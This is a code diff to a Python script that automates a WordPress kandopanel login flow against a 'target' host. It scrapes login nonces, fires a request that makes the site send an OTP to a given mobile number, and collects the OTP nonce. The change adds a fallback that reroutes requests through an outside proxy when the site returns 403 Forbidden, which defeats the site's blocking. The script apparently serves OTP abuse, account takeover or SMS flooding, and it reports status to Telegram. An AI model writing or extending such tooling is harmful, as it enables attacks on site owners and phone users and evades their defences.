@@ -101,33 +101,67 @@ def send_to_telegram(message):
         return False
 
 def fetch_nonce(host, mobile):
-    """Fetches the login_otp_nonce from the target website."""
+    """Fetches the login_otp_nonce from the target website, with proxy fallback for 403 errors."""
     try:
+        use_proxy = False
+        base_proxy_url = "https://go.tensha.ir/proxy/"
+
+        def get_url(base_url):
+            """Constructs the correct URL, applying proxy if needed."""
+            if use_proxy:
+                # The proxy takes the URL without the protocol part
+                return base_proxy_url + base_url.replace('https://', '')
+            return base_url
+
         # Step 1: Get user_login_nonce
         login_page_url = f"https://{host}/login/"
-        response = requests.get(login_page_url, timeout=15)
-        response.raise_for_status()
+        
+        try:
+            # First attempt without proxy
+            response = requests.get(login_page_url, timeout=15)
+            response.raise_for_status()
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 403:
+                app_state.add_log(f"⚠️ 403 Forbidden on {login_page_url}. Retrying with proxy.")
+                use_proxy = True
+                proxied_url = get_url(login_page_url)
+                app_state.add_log(f"🔄 Using proxy URL: {proxied_url}")
+                response = requests.get(proxied_url, timeout=25)  # Increased timeout for proxy
+                response.raise_for_status()
+            else:
+                raise  # Re-raise other HTTP errors
+
         soup = BeautifulSoup(response.text, 'html.parser')
-        user_login_nonce = soup.find('input', {'id': 'user_login_nonce'})['value']
+        user_login_nonce_element = soup.find('input', {'id': 'user_login_nonce'})
+        if not user_login_nonce_element:
+            app_state.add_log(f"❌ Could not find 'user_login_nonce' on {host}. Page content might be incorrect or blocked.")
+            return None
+        user_login_nonce = user_login_nonce_element['value']
 
         # Step 2: Send initial login request to get OTP sent
         ajax_url = f"https://{host}/wp-admin/admin-ajax.php"
         headers = {
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "X-Requested-With": "XMLHttpRequest",
-            "Referer": login_page_url
+            "Referer": login_page_url  # Referer should be the original URL
         }
         login_data = f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1"
-        requests.post(ajax_url, headers=headers, data=login_data, timeout=15)
+        
+        requests.post(get_url(ajax_url), headers=headers, data=login_data, timeout=20)
 
         # Step 3: Get the login_otp_nonce from the OTP page
         otp_page_url = f"https://{host}/login/?action=login-by-otp&mobile={mobile}"
-        response = requests.get(otp_page_url, timeout=15)
+        response = requests.get(get_url(otp_page_url), timeout=20)
         response.raise_for_status()
         soup = BeautifulSoup(response.text, 'html.parser')
-        login_otp_nonce = soup.find('input', {'id': 'login_otp_nonce'})['value']
+        
+        login_otp_nonce_element = soup.find('input', {'id': 'login_otp_nonce'})
+        if not login_otp_nonce_element:
+            app_state.add_log(f"❌ Could not find 'login_otp_nonce' on {host}. The OTP page might be blocked.")
+            return None
+        login_otp_nonce = login_otp_nonce_element['value']
 
-        app_state.add_log(f"✅ Nonce fetched successfully for {host}")
+        app_state.add_log(f"✅ Nonce fetched successfully for {host}" + (" (using proxy)" if use_proxy else ""))
         return login_otp_nonce
     except Exception as e:
         app_state.add_log(f"❌ Failed to fetch nonce for {host}: {e}")
